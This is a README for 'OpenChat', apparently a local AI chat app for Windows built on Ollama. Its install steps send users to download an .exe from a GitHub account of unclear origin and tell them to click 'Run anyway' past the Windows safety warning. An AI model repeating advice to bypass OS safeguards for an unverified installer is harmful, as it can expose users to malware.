# 🤖 OpenChat - Run Private AI Chat Locally Today

[![Download OpenChat](https://img.shields.io/badge/Download-OpenChat-blue.svg)](https://github.com/rabsharpeared662/OpenChat)

OpenChat lets you chat with a smart assistant on your own computer. Because it runs locally, your data stays on your machine. You do not need an internet connection to process your messages once the initial setup finishes. This tool uses the same technology behind modern chat assistants to help you learn, write code, or organize your thoughts.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Visit the [OpenChat download page](https://github.com/rabsharpeared662/OpenChat) to access the latest installer.
2. Look for the file ending in `.exe` under the latest release section.
3. Click the file to start the download.
4. Once the download finishes, open the folder where you saved the file.
5. Double-click the installer file. Windows might show a safety warning because the software is new. If it does, click "More info" and then "Run anyway."
6. Follow the instructions on the screen to install the application.

## 🖥️ System Requirements

OpenChat requires specific resources to function well. Ensure your computer meets these standards for the best experience:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 8 GB of RAM. 16 GB is better for faster responses.
*   **Storage:** 5 GB of free disk space for the program and the AI models.
*   **Graphics:** A dedicated graphics card helps the AI respond faster, though it works on most modern processors.

## ⚙️ Initial Setup

The first time you open OpenChat, the program downloads the brain of the AI, known as a model. 

1. Launch the program from your Start menu shortcut.
2. A black window or a specific dashboard will appear. This is Ollama, the engine that powers the AI.
3. The program checks for available models. If you have not used Ollama before, the software downloads a standard, fast model for you.
4. Wait for the progress bars to reach 100%. This happens one time only.
5. Once the download ends, the chat interface loads in your browser or a dedicated window.

## 🛠️ Main Features

OpenChat offers several tools to help with your work:

*   **Agentic Tool Calling:** The AI identifies when it needs to use external tools to find answers.
*   **Web Fetching:** The software can look up information on the web. It uses a security list to ensure it only visits safe sites.
*   **Streaming Responses:** You see the words appear as the AI generates them, just like popular online chat tools.
*   **Local Databases:** The program uses a system called MongoDB to save your past conversations securely on your own hard drive.

## 🔍 Understanding Web Fetching

Sometimes you need the AI to know facts from the current day. OpenChat can look at websites to gather this information. To keep your computer safe, the software checks every website against an allowlist. This list contains trusted domains. If the AI wants to visit a site not on the list, it asks for your permission first. This design prevents the program from visiting harmful websites without your knowledge.

## 💾 Managing Your Data

Your privacy is the focus of this project. Everything you type into OpenChat stays on your machine. The program stores your chat history in a local database file. You can delete this file at any time to remove all traces of your conversations. Because no data moves to a central server, you have total control over your digital footprint.

## 💡 Using the Chat Interface

The chat screen behaves like familiar text messaging apps. You type your question into the bar at the bottom and press Enter. The AI thinks for a moment and then replies. 

If the AI takes too long to answer, click the "Stop" button. You can clear the conversation by clicking the trash icon at the top of the screen. To start a new chat, find the "New Chat" button on the left sidebar.

## 🔧 Troubleshooting

If you encounter issues, try these steps:

*   **Program does not open:** Ensure you installed the latest version. Update your Windows if you see a prompt.
*   **AI reacts slowly:** Close other heavy programs like web browsers with many tabs or video games.
*   **Network error:** Even though the AI runs locally, some features require a stable internet connection to pull fresh data. Check your Wi-Fi or cable connection.
*   **Installation issues:** Delete the downloaded setup file and try to download it again from the primary link to ensure the file is not corrupted.

## 🧪 Advanced Learning

This project serves as a learning tool for developers. The code uses .NET 9 for the core logic and Angular 21 for the visuals. It demonstrates how to connect a modern web interface to a local AI server. If you want to contribute to the code, visit the GitHub repository and read the developer notes. You can explore how the software handles different types of information and how it makes decisions based on your prompts. 

For additional help, search for the GitHub issue tracker. If you find a bug, report it there. Provide as much detail as possible, including your Windows version and the steps you took before the problem happened. This helps clean up the code for everyone.